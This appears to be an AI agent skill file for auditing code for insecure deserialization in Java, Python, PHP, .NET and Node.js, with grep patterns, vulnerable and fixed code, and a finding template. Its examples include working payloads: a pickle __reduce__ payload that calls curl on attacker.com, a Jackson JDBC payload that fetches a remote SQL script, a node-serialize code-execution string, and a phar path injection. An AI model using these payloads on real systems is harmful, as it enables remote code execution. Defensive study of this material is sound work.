---
name: deserialization-detector
description: >
  Insecure deserialization vulnerability detection skill. Identifies untrusted object
  deserialization sinks, gadget chains, and polymorphic type injection across Java
  (ObjectInputStream, Jackson, Fastjson), Python (pickle, PyYAML, marshal), PHP
  (unserialize, POP chains, phar wrappers), .NET (BinaryFormatter, TypeNameHandling),
  Ruby (Marshal), and Node.js (node-serialize). Addresses the OWASP Top 10 Software
  and Data Integrity Failures (A08) gap. Activate when the user asks to "check deserialization",
  "audit pickle", "Java deserialization vulnerability", "PHP unserialize review",
  "Jackson polymorphic deserialization", "find gadget chains", or "insecure deserialization".
triggers:
  - "insecure deserialization"
  - "deserialization"
  - "pickle.loads"
  - "unserialize"
  - "ObjectInputStream"
  - "BinaryFormatter"
  - "gadget chain"
  - "polymorphic deserialization"
  - "Jackson default typing"
  - "PyYAML unsafe load"
  - "phar deserialization"
  - "Marshal.load"
  - "node-serialize"
version: 1.0.0
author: bug-finder-kit
category: security
risk: safe
tags: "[deserialization, owasp-a8, rce, gadget-chains, java, python, php, dotnet, security]"
date_added: "2026-10-21"
---

# Deserialization Detector — Insecure Object Deserialization & Gadget Chains

> Insecure deserialization occurs when untrusted user input is passed directly to an
> object deserializer, allowing attackers to instantiate arbitrary classes, execute
> unexpected constructor or magic methods, trigger gadget chains, and achieve
> unauthenticated Remote Code Execution (RCE) or Denial of Service (DoS).

> This skill provides static scanning rules, code patterns, and remediation guides
> covering the most dangerous deserialization sinks across enterprise runtimes.

---

## Deserialization Attack Landscape

```
Untrusted Input (HTTP Body, Cookie, Token, Queue message)
  └── Deserializer Sink
        ├── Java: ObjectInputStream.readObject(), Jackson default typing
        ├── Python: pickle.loads(), yaml.load() (without SafeLoader)
        ├── PHP: unserialize(), phar:// stream wrapper
        ├── .NET: BinaryFormatter, TypeNameHandling.All
        ├── Ruby: Marshal.load(), Psych.load()
        └── Node.js: node-serialize.unserialize()
              └── Gadget Chain Invocation
                    ├── Magic methods (__wakeup, __destruct, readObject)
                    ├── Getter/Setter execution during property binding
                    └── Target Payload: ProcessBuilder, Runtime.exec, os.system
```

---

## Phase 1 — Ecosystem Detection & Dangerous Sinks

Scan the project for known dangerous deserialization functions and modules:

### 1.1 Static Grep Patterns

```bash
# Java Sinks
grep -rn "readObject()\|readUnshared()\|XMLDecoder\|readResolve" src/
grep -rn "enableDefaultTyping\|activateDefaultTyping" src/
grep -rn "@JsonTypeInfo.*Id\.CLASS\|@JsonTypeInfo.*Id\.MINIMAL_CLASS" src/

# Python Sinks
grep -rn "pickle\.loads\|pickle\.load\|_pickle\|cPickle" .
grep -rn "yaml\.load(\s*[^,)]*\s*)" . | grep -v "SafeLoader"
grep -rn "shelve\.open\|marshal\.loads\|jsonpickle\.decode" .

# PHP Sinks
grep -rn "unserialize(" .
grep -rn "phar://" .

# .NET Sinks
grep -rn "BinaryFormatter\|NetDataContractSerializer\|ObjectStateFormatter" .
grep -rn "TypeNameHandling\.All\|TypeNameHandling\.Auto\|TypeNameHandling\.Objects" .

# Ruby Sinks
grep -rn "Marshal\.load\|YAML\.load(" .

# Node.js Sinks
grep -rn "node-serialize\|serialize\.unserialize\|funcster" .
```

---

## Phase 2 — Java Deserialization & Polymorphic JSON

### 2.1 Native Java Deserialization (`ObjectInputStream`)

Java's native serialization transmits entire object graphs. If the classpath
contains vulnerable libraries (Apache Commons Collections, Spring, Groovy, etc.),
an attacker can trigger pre-existing "gadgets" to execute arbitrary commands.

```java
// VULNERABLE: Direct deserialization of untrusted stream
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
UserSession session = (UserSession) ois.readObject(); // RCE via gadget chains!
```

**Remediation (JEP 290 Look-Ahead Deserialization Filter):**

```java
// SAFE: Enforce strict look-ahead type filtering before instantiation
ObjectInputStream ois = new ObjectInputStream(is);
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.mycompany.models.UserSession;!*" // Allow only UserSession, reject everything else
);
ois.setObjectInputFilter(filter);
UserSession session = (UserSession) ois.readObject();
```

### 2.2 Jackson Polymorphic Type Handling

When Jackson deserializes JSON with polymorphic typing enabled, it can be coerced
into instantiating arbitrary classes specified in the `@class` or `@type` property.

```java
// VULNERABLE: Enabling global default typing allows arbitrary class instantiation
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // or mapper.activateDefaultTyping(...)
Object obj = mapper.readValue(untrustedJson, Object.class);

// Attacker sends:
// ["ch.qos.logback.core.db.DriverManagerConnectionSource", 
//  {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/pwn.sql'"}]
```

**Secure Configuration:**
```java
// SAFE: Disable default typing, use explicit polymorphic subtypes with safe base types
ObjectMapper mapper = new ObjectMapper();
// Never use DefaultTyping.NON_FINAL or DefaultTyping.OBJECT_AND_NON_CONCRETE globally.
// Use explicit @JsonSubTypes on specific, sealed interfaces:
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public interface Pet {}
```

---

## Phase 3 — Python Serialization Risks (`pickle`, `PyYAML`, `marshal`)

### 3.1 Python `pickle` (Inherently Unsafe)

Python's `pickle` format is a stack-based virtual machine capable of constructing
arbitrary Python objects and invoking functions via the `__reduce__` protocol.
**Pickle cannot be secured against untrusted input.**

```python
# VULNERABLE: Deserializing pickle from untrusted cookie or request
import pickle
data = request.cookies.get("session")
session = pickle.loads(base64.b64decode(data)) # Instant RCE!
```

**Exploitation Proof of Concept (How Attacker Builds Payload):**
```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/pwned",))

payload = pickle.dumps(RCE())
```

**Remediation:**
- Replace `pickle` with standard `json` (`json.loads`, `json.dumps`).
- If complex types or binary data are required, use `Protocol Buffers`, `MessagePack`, or signed tokens (`itsdangerous.Signer` / PyJWT).

### 3.2 PyYAML Unsafe Load

By default in older PyYAML (or when calling `yaml.load` without a loader),
custom tags such as `!!python/object/apply` allow arbitrary code execution.

```python
# VULNERABLE
import yaml
config = yaml.load(user_input) # Defaults to FullLoader in older versions, RCE risk

# SAFE
config = yaml.safe_load(user_input)
# Or explicitly:
config = yaml.load(user_input, Loader=yaml.SafeLoader)
```

---

## Phase 4 — PHP Object Injection & POP Chains

PHP's `unserialize()` triggers magic methods (`__wakeup()`, `__destruct()`, `__toString()`,
`__get()`) upon execution, enabling Property-Oriented Programming (POP) chains.

### 4.1 Native `unserialize()`

```php
// VULNERABLE: Deserializing user-controlled cookie
$session = unserialize($_COOKIE['user_session']);

// Even without an explicit eval(), if an included class implements __destruct():
class LogFile {
    public $filename;
    public $content;
    function __destruct() {
        file_put_contents($this->filename, $this->content); // Arbitrary file overwrite!
    }
}
```

**Remediation:**

```php
// SAFE Option 1: Use JSON instead of PHP serialization
$session = json_decode($_COOKIE['user_session'], true);

// SAFE Option 2: Restrict allowed classes if unserialize is mandatory (PHP 7+)
$session = unserialize($_COOKIE['user_session'], ["allowed_classes" => [UserSession::class]]);
```

### 4.2 Phar Deserialization (Stream Wrapper Attack)

Even without calling `unserialize()`, file functions (`file_exists()`, `is_dir()`, `getimagesize()`)
invoked with a `phar://` URI trigger metadata deserialization automatically!

```php
// VULNERABLE: User controls file path checked by filesystem function
$path = $_GET['file']; // Attacker passes: phar:///uploads/malicious_avatar.jpg
if (file_exists($path)) { // Automatically triggers deserialization of phar metadata!
    include $path;
}
```

**Remediation:**
- Validate that paths do not contain protocols/wrappers (`preg_match('/^phar:\/\//i', $path)`).
- Use `realpath()` and enforce strict directory sandboxing.

---

## Phase 5 — .NET Deserialization & BinaryFormatter

### 5.1 `BinaryFormatter` & `NetDataContractSerializer`

Microsoft has officially deprecated `BinaryFormatter` as dangerous due to inescapable
deserialization vulnerabilities across all versions of the .NET Framework.

```csharp
// VULNERABLE: BinaryFormatter execution
BinaryFormatter formatter = new BinaryFormatter();
MemoryStream stream = new MemoryStream(untrustedBytes);
object obj = formatter.Deserialize(stream); // RCE via TypeConfuseDelegate / ActivitySurrogateSelector
```

**Remediation:**
- Migrate to `System.Text.Json` or `XmlSerializer`.
- If using `Newtonsoft.Json`, ensure `TypeNameHandling` is set to `None`:

```csharp
// SAFE
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.None // Never use TypeNameHandling.All or Auto
};
var data = JsonConvert.DeserializeObject<TargetModel>(json, settings);
```

---

## Phase 6 — Node.js & JSON Quirks

### 6.1 `node-serialize` Arbitrary Code Execution

The `node-serialize` library supports serializing JavaScript functions via `_$$ND_FUNC$$_`.
When deserializing, it immediately evaluates function strings using `eval()`.

```javascript
// VULNERABLE (Node.js)
const serialize = require('node-serialize');
const payload = '{"run": "_$$ND_FUNC$$_function (){ require(\'child_process\').execSync(\'calc.exe\'); }()}";'
serialize.unserialize(payload); // Immediate execution via IIFE!
```

### 6.2 Prototype Pollution via Deserialization

When parsing custom object payloads (such as recursive BSON, JSON-to-Map parsers),
attributes named `__proto__` or `constructor.prototype` can poison the global prototype.

```javascript
// VULNERABLE
const parsed = customUnflatten(JSON.parse(userInput));
// If userInput has {"__proto__": {"isAdmin": true}}, all objects inherit isAdmin: true
```

---

## Phase 7 — Defensive Architecture & Secure Alternatives

| Format | Security Status | Safe Replacements |
|---|---|---|
| **Java `ObjectInputStream`** | ❌ Dangerous by default | Protocol Buffers, Jackson with strict types, JEP 290 filter |
| **Python `pickle`** | ❌ Fundamentally insecure for untrusted data | `json`, `msgpack`, signed `pydantic` models |
| **Python `yaml.load`** | ❌ Dangerous without loader | `yaml.safe_load()` |
| **PHP `unserialize`** | ❌ Critical RCE risk | `json_decode($str, true)` |
| **.NET `BinaryFormatter`** | ❌ Deprecated by Microsoft | `System.Text.Json`, `XmlSerializer` |
| **Ruby `Marshal.load`** | ❌ Dangerous | `JSON.parse`, `Psych.safe_load` |
| **Node.js `node-serialize`** | ❌ RCE by design | Native `JSON.parse` |

---

## Phase 8 — Finding Format & Severity Matrix

### Severity Guide

- **Critical:** Deserialization of untrusted input using sinks known to support arbitrary object construction (`pickle.loads`, `unserialize`, `ObjectInputStream`, `BinaryFormatter`, unconstrained Jackson polymorphic types). Leads directly to RCE.
- **High:** Deserialization requiring minor preconditions or constrained gadgets that allow arbitrary file read/write, SSRF, or SQL injection.
- **Medium:** Deserialization with partial lookahead filtering but allowlists containing polymorphic types or broad package wildcards (`com.example.*`).
- **Low / Info:** Deprecated serialization libraries present on classpath but not directly tied to public input sinks.

### Finding Template

```
### [Severity] Insecure Deserialization: <Title>
- Location: <file:line> or <API Endpoint>
- Sink: <e.g., ObjectInputStream.readObject() / pickle.loads() / unserialize()>
- Vulnerability Description: <Explanation of how untrusted input reaches the sink>
- Gadget Chain Feasibility: <Known gadgets on classpath, e.g., Commons-Collections, POP chain>
- Exploit Proof of Concept:
    ```<language>
    // Example serialization payload or generator syntax
    ```
- Remediation:
    - Replace dangerous serializer with safe alternative (e.g., JSON / Protobuf)
    - If binary serialization is mandatory, apply strict allowlist filters (e.g. JEP 290)
    - Before & After code snippet
- Confidence: Confirmed | Likely | Requires Classpath Audit
```
